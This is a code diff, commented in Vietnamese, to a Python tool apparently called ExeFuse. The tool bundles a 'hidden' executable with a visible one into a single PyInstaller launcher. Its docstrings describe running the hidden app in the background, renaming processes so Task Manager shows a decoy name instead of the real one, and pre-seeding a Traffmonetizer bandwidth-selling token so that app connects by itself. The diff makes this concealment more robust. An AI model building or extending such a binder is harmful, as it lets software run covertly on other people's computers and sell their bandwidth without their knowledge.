@@ -6,6 +6,7 @@ onefile de nhung launcher + 2 file EXE thanh 1 file thuc thi duy nhat.
 """
 
 import importlib.util
+import json
 import os
 import re
 import shutil
@@ -53,7 +54,23 @@ def _safe_name(name, fallback="ExeFuse_App"):
     name = (name or "").strip()
     name = re.sub(r"[^\w\-. ]+", "", name, flags=re.UNICODE)
     name = name.strip().replace(" ", "_")
+    # Người dùng hay gõ sẵn đuôi .exe -> bỏ đi để PyInstaller không
+    # sinh file "My_App.exe.exe" (ext được thêm tự động theo OS).
+    if name.lower().endswith(".exe"):
+        name = name[:-4]
     return name or fallback
+
+
+def _esc_lit(value):
+    """Nội suy chuỗi an toàn vào literal "%%...%%" của launcher template.
+
+    Escape backslash, dấu quote và mọi ký tự điều khiển để token/alias
+    chứa ký tự đặc biệt (", \\, xuống dòng...) không làm vỡ cú pháp
+    launcher.py sinh ra (chống lỗi build trên mọi cấu hình máy).
+    """
+    # json.dumps luôn trả về literal trong dấu " và escape \uXXXX cho
+    # non-ASCII -> hợp lệ cả trong Python, bất kể encoding file.
+    return json.dumps(str(value or ""))[1:-1]
 
 
 def _mask_token(token):
@@ -131,13 +148,17 @@ def get_result(job_id):
 def start_job(workdir, hidden_src, visible_src, output_name,
               kill_hidden=True, hide_watch=True, icon_src=None,
               hidden_label=None, hidden_token="", tm_autorun=False,
-              proc_alias=""):
+              proc_alias="", hidden_is_tm=None):
     """Tao job build chay nguon (background thread).
 
     visible_src co the la None -> che do SOLO (chi nhung app an).
     hidden_token khac rong + file an la Traffmonetizer -> bat auto-token
     (launcher se ghi Token vao %APPDATA%\\traffmonetizer\\settings.json
     truoc khi chay app -> tu dang nhap + tu ket noi).
+    hidden_is_tm: True/False neu ben goi da biet chắc file an co phai
+    Traffmonetizer hay khong (theo TEN FILE GOC - vi file upload duoc
+    luu thanh upload_hidden.exe nen kiem tra theo path se SAI). Neu None
+    thi tu kiem tra theo ten file.
     proc_alias khac rong -> launcher copy 2 app sang <proc_alias>.exe truoc
     khi chay -> Task Manager hien ten trung file output thay vi ten that
     cua app an (vd __hidden_app__.exe / Traffmonetizer.exe).
@@ -148,7 +169,9 @@ def start_job(workdir, hidden_src, visible_src, output_name,
             "pip install pyinstaller"
         )
     token = (hidden_token or "").strip().strip('"').strip("'")
-    preseed = bool(token) and _is_traffmonetizer(hidden_src)
+    if hidden_is_tm is None:
+        hidden_is_tm = _is_traffmonetizer(hidden_src)
+    preseed = bool(token) and bool(hidden_is_tm)
     alias = (proc_alias or "").strip()
     job_id, job = create_job()
     thread = threading.Thread(
@@ -182,9 +205,9 @@ def _build_worker(job, workdir, hidden_src, visible_src, output_name,
             .replace("%%VISIBLE_NAME%%", VISIBLE_ASSET if visible_src else "")
             .replace("%%KILL_HIDDEN%%", "True" if kill_hidden else "False")
             .replace("%%HIDE_WATCH%%", "True" if hide_watch else "False")
-            .replace("%%PROC_ALIAS%%", proc_alias or "")
+            .replace("%%PROC_ALIAS%%", _esc_lit(proc_alias))
             .replace("%%TM_PRESEED%%", "True" if tm_preseed else "False")
-            .replace("%%TM_TOKEN%%", hidden_token if tm_preseed else "")
+            .replace("%%TM_TOKEN%%", _esc_lit(hidden_token) if tm_preseed else "")
             .replace("%%TM_AUTORUN%%", "True" if tm_autorun else "False")
         )
         launcher_py = os.path.join(workdir, "launcher.py")
